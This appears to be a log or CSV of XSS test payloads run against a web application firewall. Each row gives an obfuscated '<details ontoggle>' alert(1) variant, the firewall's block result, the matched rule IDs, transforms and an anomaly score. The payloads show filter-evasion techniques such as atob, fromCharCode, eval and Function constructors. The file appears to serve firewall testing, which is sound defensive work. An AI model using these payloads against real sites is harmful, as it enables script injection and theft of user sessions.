385,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);self[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,99t:urlDecodeUni,t:compressWhitespace || ",25,177603343181.362290
386,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o81,4v217,98 || o85,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,6v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177603343266.670873
387,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);parent[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o88,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603343373.757950
389,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);globalThis[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o92,11v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603343543.614520
390,"<details open ontoggle=""(function(){var x=String['from'+'CharCode'](97,108,101,114,116);window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,57v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,107t:urlDecodeUni,t:compressWhitespace || ",30,177603343694.360532
391,"<details open ontoggle=""(function(){var x=(String).fromCharCode(97,108,101,114,116);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o90,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o84,9v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177603343799.467035
392,"<details open ontoggle=""(function(){var x=String.fromCharCode(0141,0154,0145,0162,0164);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,11v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,17760334386.077934
393,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);this[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o86,11v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,7v217,99t:urlDecodeUni,t:compressWhitespace || ",25,177603343929.393599
394,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);window[''+x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o88,14v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || o25,11v217,104t:urlDecodeUni || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,12v217,104t:urlDecodeUni,t:compressWhitespace || ",30,177603343987.733576
395,"<details open ontoggle=""(function(){var x=unescape('%61%6c%65%72%74');window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o66,11v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,89 || o25,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,9v217,89t:urlDecodeUni,t:compressWhitespace || ",30,177603344085.738801
396,"<details open ontoggle=""(function(){var x=decodeURI('%61%6c%65%72%74');window[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o67,11v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,90 || o25,11v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,90t:urlDecodeUni,t:compressWhitespace || ",30,177603344127.889270
397,"<details open ontoggle=""(function(){var x=String.fromCharCode.apply(null,[97,108,101,114,116]);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,11v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,114t:urlDecodeUni,t:compressWhitespace || ",25,177603344213.222860
400,"<details open ontoggle=""(function(){var x=String.fromCharCode(97,108,101,114,116);window[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,101t:urlDecodeUni,t:compressWhitespace || ",25,177603344518.612827
401,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');self[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,7v217,75t:urlDecodeUni,t:compressWhitespace || ",25,177603344644.305173
403,"<details open ontoggle=""(function(){var x=atob`YWxlcnQ`;window[x]`1`;})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,75t:urlDecodeUni,t:compressWhitespace || ",20,177603344820.358153
404,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');top[x](1);})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o57,4v217,74 || o61,11v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,6v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177603344927.007466
405,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');globalThis[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o68,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603345091.631858
406,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');parent[x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o64,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603345189.992842
407,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');this[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,7v217,75t:urlDecodeUni,t:compressWhitespace || ",25,177603345230.982318
409,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');(0,window[x])(1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o67,12v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,9v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177603345334.734034
410,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');(window)[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o58,19v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,10v217,79t:urlDecodeUni,t:compressWhitespace || ",25,177603345480.735767
411,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');Reflect.get(window,x)(1);})()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760334557.603469
412,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');Reflect.apply(window[x],null,[1]);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o72,9v217,98t:urlDecodeUni,t:compressWhitespace || ",20,177603345616.781647
413,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');Function('return '+x)()(1);})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o66,23v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,91 || o25,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603345768.838918
414,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');[window][0][x](1);})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o58,22v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603345811.532753
415,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');window[''+x+''](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o64,17v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || o25,11v217,83t:urlDecodeUni || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,15v217,83t:urlDecodeUni,t:compressWhitespace || ",30,177603345949.887701
416,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');(1,eval)('window.'+x+'(1)');})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,92 || o25,11v217,92t:urlDecodeUni || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603346092.625199
417,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');setTimeout(x+'(1)',0);})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603346173.684316
418,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');new Function(x+'(1)')();})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o70,16v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603346267.920302
419,"<details open ontoggle=""(function(){var x=atob('YWxlcnQ');window[Object.keys(window).find(k=>k==x)](1);})()"">",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,41v217,109t:urlDecodeUni,t:compressWhitespace || ",20,177603346317.374275
420,"<details open ontoggle=""(function(){self['ev'+'al']('al'+'ert(1)')})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,46v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,82 || o25,11v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,82t:urlDecodeUni,t:compressWhitespace || ",30,17760334643.600836
421,"<details open ontoggle=""(function(){top['al'+'ert'].call(this,1)})()""></details>",0,1,block,7,"932105,934100,934100,941100,941120,941370,949110","o33,6v217,80 || o25,11v217,80 || o25,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,15v217,80t:urlDecodeUni,t:compressWhitespace || ",30,177603346580.240493
423,"<details open ontoggle=""(function(){window[String.fromCharCode(97,108,101,114,116)](1)})()""></details>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,47v217,102t:urlDecodeUni,t:compressWhitespace || ",20,177603346744.624121
424,"<details open ontoggle=""(function(){globalThis['ale'+'rt'](1)})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603346889.735026
425,"<details open ontoggle=""(function(){frames['al'+'ert'](1)})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,37v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603346948.839960
426,"<details open ontoggle=""(function(){this['al'+'ert'](1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,35v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,71 || o25,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,16v217,71t:urlDecodeUni,t:compressWhitespace || ",30,177603347063.804177
427,"<details open ontoggle=""(function(){[]['constructor']['constructor']('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,65v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,101 || o25,11v217,101t:urlDecodeUni || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603347186.924518
428,"<details open ontoggle=""(function(){(()=>window['al'+'ert'](1))()})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,45v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,18v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603347248.909177
429,"<details open ontoggle=""(function(){Function('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || o25,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603347336.001744
430,"<details open ontoggle=""(function(){setTimeout('al'+'ert(1)',0)})()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603347463.375958
431,"<details open ontoggle=""(function(){setInterval('al'+'ert(1)',0)})()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,80 || o25,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603347433.307143
432,"<details open ontoggle=""(function(){new Function('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,45v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,81 || o25,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603347589.178227
433,"<details open ontoggle=""(function(){({}).constructor.constructor('al'+'ert(1)')()})()""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,61v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,97 || o25,11v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603347681.710683
434,"<details open ontoggle=""(function(){!function(){window['al'+'ert'](1)}()})()""></details>",0,1,block,8,"932100,933210,934100,934100,941100,941120,941370,949110","o33,12v217,88 || o45,31v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,88 || o25,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,18v217,88t:urlDecodeUni,t:compressWhitespace || ",35,177603347777.187536
435,"<details open ontoggle=""(function(){+function(){self['al'+'ert'](1)}()})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,50v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,86 || o25,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,16v217,86t:urlDecodeUni,t:compressWhitespace || ",30,17760334789.324357
436,"<details open ontoggle=""(function(){void(window['al'+'ert'](1))})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,43v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,18v217,79t:urlDecodeUni,t:compressWhitespace || ",30,17760334801.261596
437,"<details open ontoggle=""(function(){with(window)al\u0065rt(1)})()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603348191.309002
438,"<details open ontoggle=""(function(){return window['al'+'ert'](1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,44v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,80 || o25,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,18v217,80t:urlDecodeUni,t:compressWhitespace || ",30,17760334819.186225
439,"<details open ontoggle=""(function(){throw window['al'+'ert'](1)})()""></details>",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,43v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,18v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177603348244.317164
440,"<details open ontoggle=""(function(){with(this){eval(String.fromCharCode(97,108,101,114,116,40,49,41))}})()"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o46,5v217,108 || o47,59v217,108 || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603348398.335665
441,"<details open ontoggle=""(function(){with(this){eval(atob('YWxlcnQoMSk='))}})()"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o46,5v217,80 || o47,31v217,80 || o25,11v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603348470.073958
442,"<details open ontoggle=""(function(){with(this){this['ev'+'al']('al'+'ert(1)')}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,58v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,84 || o25,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,21v217,84t:urlDecodeUni,t:compressWhitespace || ",30,177603348515.705243
444,"<details open ontoggle=""(function(){with(this){Function('al'+'ert(1)')()}})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,53v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || o25,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603348714.091840
446,"<details open ontoggle=""(function(){with(this){eval(`al`+`ert(1)`)}})()"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o46,5v217,73 || o47,24v217,73 || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603348968.787805
